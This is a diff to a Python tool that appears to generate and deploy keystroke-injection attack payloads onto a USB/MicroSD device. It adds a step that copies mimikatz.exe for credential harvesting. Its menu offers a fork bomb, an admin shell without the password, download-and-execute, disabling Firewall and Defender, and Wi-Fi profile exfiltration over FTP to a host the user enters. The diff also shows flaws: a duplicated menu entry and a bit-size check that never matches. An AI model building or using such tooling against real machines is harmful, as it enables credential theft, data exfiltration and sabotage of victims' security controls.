@@ -248,7 +248,7 @@ def generate_payload(payload, formatter):
         if deploy == "n":
             return True
         elif deploy == "y":
-            deploy_payload(payload)
+            deploy_payload(payload, formatter)
             return True
         else:
             return False
@@ -276,7 +276,7 @@ def locate_usb():
                 drive_list.append(drname)
     return drive_list
 
-def deploy_payload(payload):
+def deploy_payload(payload, formatter=None):
     """
     deploy_payload(payload)
 
@@ -293,25 +293,57 @@ def deploy_payload(payload):
                     ":", "").replace("\\", "")))
                 subprocess.run("move injections\\{0}.bin {1}:\\inject.bin".format(payload, usb_drive), shell=True,
                                check=True)
-                subprocess.run("copy payloads\\exfil\\e.cmd {1}:\\e.cmd".format(payload, usb_drive), shell=True,
+                subprocess.run("copy payloads\\exfil\\e.cmd {0}:\\e.cmd".format(usb_drive), shell=True,
                                check=True)
-                subprocess.run("copy payloads\\exfil\\d.cmd {1}:\\d.cmd".format(payload, usb_drive), shell=True,
+                subprocess.run("copy payloads\\exfil\\d.cmd {0}:\\d.cmd".format(usb_drive), shell=True,
                                check=True)
-                subprocess.run("copy payloads\\exfil\\i.vbs {1}:\\i.vbs".format(payload, usb_drive), shell=True,
+                subprocess.run("copy payloads\\exfil\\i.vbs {0}:\\i.vbs".format(usb_drive), shell=True,
                                check=True)
-                subprocess.run("mkdir {1}:\\slurp".format(payload, usb_drive), shell=True, check=True)
+                subprocess.run("mkdir {0}:\\slurp".format(usb_drive), shell=True, check=True)
                 print_msg('success', "Deployment of payload succeeded")
             elif platform.system() == "Linux":
                 usb_drive = print_msg('question', "Please provide your MicroSD's location? (/media/user/label) ")
                 subprocess.run("mv injections/{0}.bin {1}/inject.bin".format(payload, usb_drive), shell=True,
                                check=True)
-                subprocess.run("cp payloads/exfil/e.cmd {1}/e.cmd".format(payload, usb_drive), shell=True,
+                subprocess.run("cp payloads/exfil/e.cmd {0}/e.cmd".format(usb_drive), shell=True,
                                check=True)
-                subprocess.run("cp payloads/exfil/d.cmd {1}/d.cmd".format(payload, usb_drive), shell=True,
+                subprocess.run("cp payloads/exfil/d.cmd {0}/d.cmd".format(usb_drive), shell=True,
                                check=True)
-                subprocess.run("cp payloads/exfil/i.vbs {1}/i.vbs".format(payload, usb_drive), shell=True,
+                subprocess.run("cp payloads/exfil/i.vbs {0}/i.vbs".format(usb_drive), shell=True,
                                check=True)
-                subprocess.run("mkdir {1}/slurp".format(payload, usb_drive), shell=True, check=True)
+                subprocess.run("mkdir {0}/slurp".format(usb_drive), shell=True, check=True)
+                print_msg('success', "Deployment of payload succeeded")
+        elif payload == "mimikatz_twinduck":
+            if platform.system() == "Windows":
+                usb_drive = print_msg('question', "Please provide your MicroSD's drive letter? ({0})".format(locate_usb().replace(
+                    ":", "").replace("\\", "")))
+                subprocess.run("move injections\\{0}.bin {1}:\\inject.bin".format(payload, usb_drive), shell=True,
+                               check=True)
+
+                if formatter[0] == "64":
+                    subprocess.run(
+                        "copy payloads\\mimikatz\\mimikatz.exe {0}:\\mimikatz.exe".format(usb_drive),
+                        shell=True, check=True)
+                else:
+                    subprocess.run(
+                        "copy payloads\\mimikatz\\mimikatz_x64.exe {0}:\\mimikatz.exe".format(usb_drive),
+                        shell=True, check=True)
+
+                print_msg('success', "Deployment of payload succeeded")
+            elif platform.system() == "Linux":
+                usb_drive = print_msg('question', "Please provide your MicroSD's location? (/media/user/label) ")
+                subprocess.run("mv injections/{0}.bin {1}/inject.bin".format(payload, usb_drive), shell=True,
+                               check=True)
+
+                if formatter[0] == "64":
+                    subprocess.run(
+                        "cp payloads/mimikatz/mimikatz.exe {0}/mimikatz.exe".format(usb_drive),
+                        shell=True, check=True)
+                else:
+                    subprocess.run(
+                        "cp payloads/mimikatz/mimikatz_x64.exe {0}/mimikatz.exe".format(usb_drive),
+                        shell=True, check=True)
+
                 print_msg('success', "Deployment of payload succeeded")
         else:
             if platform.system() == "Windows":
@@ -325,6 +357,9 @@ def deploy_payload(payload):
                 subprocess.run("mv injections/{0}.bin {1}/inject.bin".format(payload, usb_drive), shell=True,
                                check=True)
                 print_msg('success', "Deployment of payload succeeded")
+
+
+
     except FileNotFoundError as err:
         print("[-] DEPLOY ERROR: {0}".format(err))
     except subprocess.CalledProcessError as err:
@@ -369,25 +404,28 @@ def select_payload():
         print("[2]  Mimikatz Cred Harvester")
         print("Find passwords with mimkatz")
         print("-------------------------------------------------")
-        print("[3]  Fork Bomb (Win7) ")
+        print("[3]  Mimikatz Cred Harvester")
+        print("Find passwords with mimkatz")
+        print("-------------------------------------------------")
+        print("[4]  Fork Bomb (Win7) ")
         print("Makes and then executes a fork bomb")
         print("-------------------------------------------------")
-        print("[4]  Admin Command Prompt")
+        print("[5]  Admin Command Prompt")
         print("Opens an cmd in admin without the admin password")
         print("-------------------------------------------------")
-        print("[5]  Download a file")
+        print("[6]  Download a file")
         print("Download and then execute a given .exe")
         print("-------------------------------------------------")
-        print("[6]  Download a file v2")
+        print("[7]  Download a file v2")
         print("Disable Firewall & Defender, download and then execute a given .exe. (v2)")
         print("-------------------------------------------------")
-        print("[7]  Exfiltrate Wi-Fi Profiles via FTP")
+        print("[8]  Exfiltrate Wi-Fi Profiles via FTP")
         print("This is number 6 + Export and exfiltrate Wif-Fi Profiles via FTP")
         print("-------------------------------------------------")
-        print("[8]  Exfiltrate Wi-Fi Profiles via Storage (Twin Duck)")
+        print("[9]  Exfiltrate Wi-Fi Profiles via Storage (Twin Duck)")
         print("This is number 6 + Export and exfiltrate Wif-Fi Profiles via Twin Duck Storage")
         print("-------------------------------------------------")
-        print("[9]  Initiate a download on an Android device via browser")
+        print("[10]  Initiate a download on an Android device via browser")
         print("Download a file from a specific web address via browser")
         print("-------------------------------------------------")
         print("[99] Exit")
@@ -403,20 +441,30 @@ def select_payload():
             formatter = [url]
             generate_payload('mimikatz', formatter)
         elif script == "3":
-            generate_payload('fork', None)
+            bit = print_msg('question', "(32|64) bit: ")
+            formatter = None
+
+            if bit == "32":
+                formatter = ["mimikatz.exe"]
+            else:
+                formatter = ["mimikatz_x64.exe"]
+
+            generate_payload('mimikatz_twinduck', formatter)
         elif script == "4":
-            generate_payload('admin', None)
+            generate_payload('fork', None)
         elif script == "5":
-            url = print_msg('question', "URL: ")
-            exe = print_msg('question', "EXE NAME: ")
-            formatter = [url, exe]
-            generate_payload('download', formatter)
+            generate_payload('admin', None)
         elif script == "6":
             url = print_msg('question', "URL: ")
             exe = print_msg('question', "EXE NAME: ")
             formatter = [url, exe]
-            generate_payload('exec_fetched_payload', formatter)
+            generate_payload('download', formatter)
         elif script == "7":
+            url = print_msg('question', "URL: ")
+            exe = print_msg('question', "EXE NAME: ")
+            formatter = [url, exe]
+            generate_payload('exec_fetched_payload', formatter)
+        elif script == "8":
             ftphost = print_msg('question', "FTP HOST: ")
             username = print_msg('question', "FTP USERNAME: ")
             password = print_msg('question', "FTP PASSWORD: ")
@@ -424,12 +472,12 @@ def select_payload():
             exe = print_msg('question', "EXE NAME: ")
             formatter = [ftphost, username, password, url, exe]
             generate_payload('extract_wifi_profiles_exec_fetched_payload', formatter)
-        elif script == "8":
+        elif script == "9":
             url = print_msg('question', "URL: ")
             exe = print_msg('question', "EXE NAME: ")
             formatter = [url, exe]
             generate_payload('exfil', formatter)
-        elif script == "9":
+        elif script == "10":
             url = print_msg('question', "URL: ")
             formatter = [url]
             generate_payload('android_browser_download', formatter)
